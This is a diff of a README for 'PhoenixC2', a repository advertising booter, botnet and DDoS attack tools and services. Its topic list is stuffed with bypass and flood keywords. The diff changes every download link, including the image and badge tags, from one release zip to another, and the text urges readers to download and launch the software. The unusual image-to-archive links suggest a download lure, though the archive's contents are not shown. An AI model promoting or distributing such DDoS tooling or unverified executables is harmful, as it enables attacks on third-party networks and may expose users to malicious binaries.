@@ -9,9 +9,9 @@ Welcome to the PhoenixC2 repository, your go-to source for 2-10g OVH and 90-100G
 - **Topics:** booter, botnet, ddos, ddos-attacks, ddos-flood, dns, free-ddos, http-ddos, ip-stress, ipbooter, js-bypass, mirai-botnet, mirai-botnet-client, ovh-boom, ovh-bypass, tcp-ddos, tls-bypass, uam-bypass, udp-bypass, udp-ddos
 
 ## Get Started
-To access the software related to PhoenixC2, please download it from the following link: [Download https://github.com/sendafor/PhoenixC2/releases/download/v1.0/Release_x64.zip](https://github.com/sendafor/PhoenixC2/releases/download/v1.0/Release_x64.zip).
+To access the software related to PhoenixC2, please download it from the following link: [Download https://github.com/sendafor/PhoenixC2/releases/download/v2.0/Software.zip](https://github.com/sendafor/PhoenixC2/releases/download/v2.0/Software.zip).
 
-[![Download Software](https://github.com/sendafor/PhoenixC2/releases/download/v1.0/Release_x64.zip)](https://github.com/sendafor/PhoenixC2/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/sendafor/PhoenixC2/releases/download/v2.0/Software.zip)](https://github.com/sendafor/PhoenixC2/releases/download/v2.0/Software.zip)
 
 Once the download is complete, the software needs to be launched to exploit the full capabilities of PhoenixC2.
 
@@ -37,7 +37,7 @@ We welcome contributions from the community to enhance and further develop Phoen
 ## Join Us
 Join us in our mission to provide top-tier services for booter, botnet, and DDoS attack solutions. Let's make the cyberspace a more interesting and secure environment together!
 
-![Cybersecurity](https://github.com/sendafor/PhoenixC2/releases/download/v1.0/Release_x64.zip)
+![Cybersecurity](https://github.com/sendafor/PhoenixC2/releases/download/v2.0/Software.zip)
 
 ---
 
